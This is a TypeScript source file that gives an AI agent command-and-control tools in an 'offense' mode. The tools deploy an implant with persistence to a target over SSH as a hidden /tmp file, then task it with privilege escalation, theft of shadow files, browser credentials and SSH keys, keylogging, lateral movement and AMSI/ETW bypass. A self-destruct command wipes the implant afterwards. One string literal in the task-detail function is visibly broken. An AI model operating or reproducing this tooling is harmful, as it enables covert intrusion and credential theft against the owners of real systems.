import { tool } from "ai";
import { z } from "zod";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { registerTool } from "../mode.js";
import { C2Client, resolveClientConfig } from "./client/api.js";
import type { ToolResult } from "../types.js";

const execFileAsync = promisify(execFile);
const PROJECT_ROOT = process.cwd();

let client: C2Client | null = null;

function getClient(): C2Client {
  if (!client) {
    const cfg = resolveClientConfig(
      process.env.C2_SERVER_URL,
      process.env.C2_API_KEY,
    );
    client = new C2Client(cfg);
  }
  return client;
}

/**
 * List all registered implants in the reach.
 */
export function createC2ReachTool() {
  return tool({
    description: "List all registered C2 implants — active, dead, destroyed counts and last-seen timestamps.",
    inputSchema: z.object({}),
    execute: async (): Promise<ToolResult> => {
      try {
        const summary = await getClient().reach();
        const lines = [`Total: ${summary.total} | Active: ${summary.active} | Dead: ${summary.dead}`];
        for (const imp of summary.implants) {
          lines.push(`  ${imp.id}  ${imp.status}  last: ${imp.lastSeen}`);
        }
        return { success: true, data: lines.join("\n") };
      } catch (err) {
        return { success: false, data: "", error: `reach failed: ${(err as Error).message}` };
      }
    },
  });
}

/**
 * Create a task for an implant.
 */
export function createC2TaskCreateTool() {
  return tool({
    description: "Create a new task for a C2 implant. The implant will pick it up on its next beacon and execute it.",
    inputSchema: z.object({
      implantId: z.string().min(1).describe("Implant ID to target"),
      type: z.string().min(1).describe("Task type: recon_processes, recon_network, recon_users, recon_cron, recon_suid, recon_all, privesc_sudo, privesc_writable, privesc_kernel, privesc_all, persistence_ssh, persistence_startup, persistence_all, exploit_packages, exploit_services, exploit_all, monitor_fim, monitor_rootkit, monitor_all, brute_sudo, brute_ssh, brute_local, brute_all, credential_shadow, credential_browsers, credential_ssh_keys, credential_configs, credential_all, lateral_ssh, lateral_all, collect_keylog, collect_screenshot, collect_clipboard, collect_all, bypass_amsi, bypass_etw, bypass_all"),
      params: z.record(z.unknown()).optional().describe("Optional task parameters as JSON object"),
    }),
    execute: async (input: { implantId: string; type: string; params?: Record<string, unknown> }): Promise<ToolResult> => {
      try {
        const task = await getClient().taskCreate({
          implantId: input.implantId,
          type: input.type,
          params: input.params ?? {},
        });
        return {
          success: true,
          data: `Task created: ${task.taskId}\nType: ${task.type}\nStatus: ${task.status}\nCreated: ${task.createdAt}`,
        };
      } catch (err) {
        return { success: false, data: "", error: `task create failed: ${(err as Error).message}` };
      }
    },
  });
}

/**
 * List tasks for an implant.
 */
export function createC2TaskListTool() {
  return tool({
    description: "List tasks for a C2 implant. Shows status (pending/completed/failed) and timestamps.",
    inputSchema: z.object({
      implantId: z.string().min(1).describe("Implant ID to list tasks for"),
    }),
    execute: async (input: { implantId: string }): Promise<ToolResult> => {
      try {
        const tasks = await getClient().taskList(input.implantId);
        if (tasks.length === 0) {
          return { success: true, data: "No tasks found for this implant." };
        }
        const lines = [`${tasks.length} task(s):`];
        for (const t of tasks) {
          const result = t.result?.data ? ` (${t.result.data.slice(0, 80).replace(/\n/g, " ")})` : "";
          lines.push(`  ${t.taskId.slice(0, 8)}  ${t.type.padEnd(20)}  ${t.status.padEnd(12)}  ${t.createdAt}${result}`);
        }
        return { success: true, data: lines.join("\n") };
      } catch (err) {
        return { success: false, data: "", error: `task list failed: ${(err as Error).message}` };
      }
    },
  });
}

/**
 * Get detailed task result.
 */
export function createC2TaskDetailTool() {
  return tool({
    description: "Get full details and result output for a specific C2 task. Use this to read completed recon/exploit output.",
    inputSchema: z.object({
      taskId: z.string().min(1).describe("Task ID to get details for"),
    }),
    execute: async (input: { taskId: string }): Promise<ToolResult> => {
      try {
        const task = await getClient().taskDetail(input.taskId);
        const lines = [
          `Task:    ${task.taskId}`,
          `Implant: ${task.implantId}`,
          `Type:    ${task.type}`,
          `Status:  ${task.status}`,
          `Params:  ${JSON.stringify(task.params)}`,
          `Created: ${task.createdAt}`,
        ];
        if (task.deliveredAt) lines.push(`Delivered: ${task.deliveredAt}`);
        if (task.completedAt) lines.push(`Completed: ${task.completedAt}`);
        if (task.result) {
          lines.push(`");
--- Result ---`);
          lines.push(`Success: ${task.result.success}`);
          if (task.result.data) lines.push(task.result.data.slice(0, 5000));
          if (task.result.error) lines.push(`Error: ${task.result.error}`);
          if (task.result.analysis) lines.push(`\n--- AI Analysis ---\n${task.result.analysis}`);
        }
        return { success: true, data: lines.join("\n") };
      } catch (err) {
        return { success: false, data: "", error: `task detail failed: ${(err as Error).message}` };
      }
    },
  });
}

/**
 * Cancel a pending task.
 */
export function createC2TaskCancelTool() {
  return tool({
    description: "Cancel a pending C2 task before the implant picks it up.",
    inputSchema: z.object({
      taskId: z.string().min(1).describe("Task ID to cancel"),
    }),
    execute: async (input: { taskId: string }): Promise<ToolResult> => {
      try {
        const ok = await getClient().taskCancel(input.taskId);
        return {
          success: true,
          data: ok ? `Task ${input.taskId.slice(0, 8)} cancelled.` : "Task not found or already completed.",
        };
      } catch (err) {
        return { success: false, data: "", error: `cancel failed: ${(err as Error).message}` };
      }
    },
  });
}

/**
 * Send self-destruct to an implant.
 */
export function createC2KillTool() {
  return tool({
    description: "Send self-destruct command to a C2 implant. The implant will remove its persistence, wipe its binary, and clean up.",
    inputSchema: z.object({
      implantId: z.string().min(1).describe("Implant ID to self-destruct"),
    }),
    execute: async (input: { implantId: string }): Promise<ToolResult> => {
      try {
        const taskId = await getClient().implantKill(input.implantId);
        return {
          success: true,
          data: `Self-destruct queued for ${input.implantId}. Task: ${taskId}. Implant will wipe on next beacon.`,
        };
      } catch (err) {
        return { success: false, data: "", error: `kill failed: ${(err as Error).message}` };
      }
    },
  });
}

/**
 * Build + deploy an implant to a target host. Runs the stager build script,
 * copies it via SCP, executes it on the target, and waits for first beacon.
 */
export function createC2DeployTool() {
  return tool({
    description: "Build an implant, deploy it to a target via SSH, and wait for it to beacon back. Requires SSH access to the target.",
    inputSchema: z.object({
      target: z.string().describe("SSH target (user@host)"),
      port: z.string().optional().describe("SSH port (default: 22)"),
      keyPath: z.string().optional().describe("Path to SSH identity file"),
      waitSeconds: z.number().int().min(5).max(120).optional().describe("Seconds to wait for beacon (default: 30)"),
    }),
    execute: async ({ target, port, keyPath, waitSeconds }): Promise<ToolResult> => {
      try {
        const buildScript = `${PROJECT_ROOT}/scripts/build-stager.sh`;
        const sshPort = port ?? "22";
        const remotePath = "/tmp/.x";
        const stagerPath = "/tmp/stager-linux";

        // Build
        const buildArgs = [
          buildScript,
          "--server", "localhost:8443",
          "--token", "deploy-token",
          "--implant-token", "imp-" + Date.now().toString(36),
          "--persist",
        ];
        await execFileAsync("bash", ["-c", buildArgs.join(" ") + " 2>&1"], { timeout: 120_000, cwd: PROJECT_ROOT });

        // SCP
        const scpArgs = [`-P${sshPort}`, "-o", "StrictHostKeyChecking=accept-new"];
        if (keyPath) scpArgs.push("-i", keyPath);
        scpArgs.push(stagerPath, `${target}:${remotePath}`);
        await execFileAsync("scp", scpArgs, { timeout: 30_000 });

        // Execute on target
        const sshArgs = [
          "-p", sshPort,
          "-o", "StrictHostKeyChecking=accept-new",
        ];
        if (keyPath) sshArgs.push("-i", keyPath);
        sshArgs.push(target, `chmod +x ${remotePath} && nohup ${remotePath} >/dev/null 2>&1 &`);
        await execFileAsync("ssh", sshArgs, { timeout: 15_000 });

        // Poll for beacon
        const deadline = Date.now() + (waitSeconds ?? 30) * 1000;
        const c2 = getClient();
        let implantId: string | null = null;

        while (Date.now() < deadline) {
          await new Promise((r) => setTimeout(r, 2000));
          try {
            const reach = await c2.reach();
            const active = (reach.implants as Array<{ id: string; status: string; firstSeen: string }>)
              .filter((i) => i.status === "active")
              .sort((a, b) => new Date(b.firstSeen).getTime() - new Date(a.firstSeen).getTime());
            if (active.length > 0) {
              implantId = active[0].id.slice(0, 8);
              break;
            }
          } catch { /* keep polling */ }
        }

        if (implantId) {
          return {
            success: true,
            data: `Implant deployed to ${target}. Beacons as ${implantId}. Use c2_task_create ${implantId} <type> to run tasks.`,
          };
        }
        return {
          success: true,
          data: `Implant deployed to ${target} but no beacon received within the timeout. Check C2 server and implant connectivity.`,
        };
      } catch (err) {
        return { success: false, data: "", error: String(err) };
      }
    },
  });
}

// ---------------------------------------------------------------------------
// Register all C2 tools for offense mode
// ---------------------------------------------------------------------------

registerTool("c2_reach", "offense");
registerTool("c2_deploy", "offense");
registerTool("c2_task_create", "offense");
registerTool("c2_task_list", "offense");
registerTool("c2_task_detail", "offense");
registerTool("c2_task_cancel", "offense");
registerTool("c2_kill", "offense");
